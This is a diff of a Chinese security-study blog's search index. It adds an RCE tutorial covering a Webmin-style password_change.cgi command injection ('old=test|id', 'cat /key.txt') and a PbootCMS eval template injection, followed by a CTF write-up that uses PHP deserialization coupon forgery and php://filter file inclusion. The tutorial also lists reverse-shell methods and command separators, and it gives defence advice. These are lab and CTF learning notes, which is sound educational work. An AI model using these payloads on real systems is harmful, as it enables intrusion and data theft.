+POST /password_change.cgi HTTP/1.1Host: 182.44.114.36:46542Cookie: redirect=1;testing=1; sid=x; sessiontest=1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brDnt: 1Referer: https://182.44.114.36:46542/session_login.cgiContent-Type: application/x-www-form-urlencodedContent-Length: 62Connection: keep-aliveuser=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2
+
+Host: 靶机IP:端口	改成自己的
+常用 Payload
+
+old=test|id 执行id查看当前用户
+old=test|ls / 列出根目录文件
+old=test|cat /key.txt 读取根目录key
+
+
+
+
+获取 cookie
+
+
+
+
+
+
+
+案例4 PbootCMS代码执行漏洞
+
+(1) 漏洞分析漏洞成因：页面{pboot:if(eval($_POST[1]))}标签解析，POST参数1可控。
+审计⼯具查询危险函数：
+
+
+
+
+
+
+
+
+eval(&#x27;if(&#x27; . $matches[1][$i] . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;);
+
+(2) 操作
+在线留言
+
+
+
+AboutController ： &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;/pboot:if&#125;  
+
+
+
+
+
+
+
+
+登录后台：admin.php
+
+
+
+账号：admin 密码：1234556
+
+
+
+
+
+访问首页：http://localhost/pcms/index.php/about/10.html
+POST传参：1=phpinfo();，触发eval执行代码。
+
+
+
+
+三、RCE漏洞防御方案
+危险函数入参做严格黑名单&#x2F;白名单过滤，过滤| &amp; ; $ &gt; &lt;等命令拼接符号。
+尽量避免使用eval、system、exec、shell_exec、``反引号等高危执行函数。
+若业务必须使用命令执行函数，采用escapeshellarg&#x2F;escapeshellcmd对输入转义过滤。
+
+
+四、总结Q1：命令执行漏洞是什么？分别叫什么？remote command execution 远程命令执行
+remote code execution 远程代码执行
+Q2：命令执行漏洞的危害是什么？执行系统命令
+权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）
+查看权限的命令
+Linux 查看权限：id
+Windows 查看权限：whoami &#x2F;all 或 whoami &#x2F;priv
+Q3：如何挖掘 RCE 漏洞？黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞
+Q4：如果给源代码，如何进行代审？通过找命令执行函数
+例如：
+
+system：执行系统命令，自带输出结果。
+shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。
+例如： echo shell_exec($cmd);
+
+
+exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。
+例如： echo exec($cmd);
+
+
+passthru：执行系统命令，自带输出结果。
+popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。
+&#96;(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。
+
+Q5：RCE漏洞中，命令拼接符有哪些？&amp;&amp;		||	|	;（Windows 不支持）	&amp;
+Q6：如何反弹 shell？
+nc 反弹 shell
+bash 反弹 shell
+（Windows）powershell 反弹shell	Online - Reverse Shell Generator
+
+Q7：如何修复 RCE 漏洞？
+后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）
+php 自带函数（禁用）PHP: escapeshellarg - Manual
+在给源代码的情况下，找 PHP 配置中的 disable_functions&#x3D;shell_exec、system、exec、passthru、popen
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -1852,16 +1725,143 @@ ID、随机数生成规则简单，可枚举&#x2F;预测
       </tags>
   </entry>
   <entry>
-    <title>Hello！</title>
-    <url>/2026/05/19/hello-world/</url>
-    <content><![CDATA[欢迎来到我的博客！这是我的第一篇文章。
-关于我你好，我是 Jasmine_Iris。
-关于这个博客这里会记录我的学习、思考和分享。
-感谢你的来访 ~
+    <title>御网杯Web部分题解</title>
+    <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
+    <content><![CDATA[一、WEB-Snake_Game1. 题目
+
+
+
+2. 解题思路
+题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300
+F12
+
+
+
+
+添加覆盖脚本
+
+
+
+修改成功！
+
+
+
+拿到 flag
+
+
+
+
+二、WEB-PHP_Payment1. 题目
+
+2. 解题思路
+根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag
+
+
+
+
+下载附件，收集信息
+
+
+
+代码审计 apply_coupon.php
+1、包含了另外两个文件
+
+
+2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错
+
+
+如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁
+再看models.php 里的类
+
+
+有两个属性，一是代金券金额，一是代金券码。
+含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。
+所以，目标就是，构造一个金额够买 Flag
+3、 构造 代金券
+&lt;?php  class PromoManager &#123;  public $promo_code = &quot;x&quot;;  public $promo_credit = 10000000;&#125;echo base64_encode(serialize(new PromoManager()));?&gt;
+
+
+
+TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
+
+
+
+
+
+购买 Flag，看 buy.php
+
+
+
+
+
+
+
+用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag
+
+
+依据这个 调用 fetch
+fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)
+
+拿到 flag
+
+
+
+
+
+三、WEB-Enterprise_OA1. 题目
+
+
+
+2. 解题思路
+根据题目提示，这题考查目录穿越、文件包含
+先尝试访问 flag.php
+
+
+
+include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’
+路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。
+并且服务器是：
+
+
+说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）
+
+读源代码
+
+
+
+用 php 伪协议
+php://filter/read=convert.base64-encode/resource=index.php
+
+
+
+利用 base64 在线解密工具
+PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwcHg7IGNvbG9yOiAjMzMzOyBsaW5lLWhlaWdodDogMS42OyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICBFbnRlcnByaXNlIE9BIFN5c3RlbQogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9Im5hdiI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9cHVibGljX25vdGljZXMucGhwIj5Ob3RpY2VzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWFib3V0LnBocCI+QWJvdXQgVXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJG1vZHVsZSk7ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==
+
+
+
+
+访问绝对路径
+
+
+
+
+访问 flag 文件
+
+比如：flag.php   flag.txt
+
+
+
+
+
+
 ]]></content>
       <categories>
-        <category>随笔</category>
+        <category>CTF-WP</category>
+        <category>比赛</category>
       </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
   </entry>
   <entry>
     <title>文件上传漏洞</title>
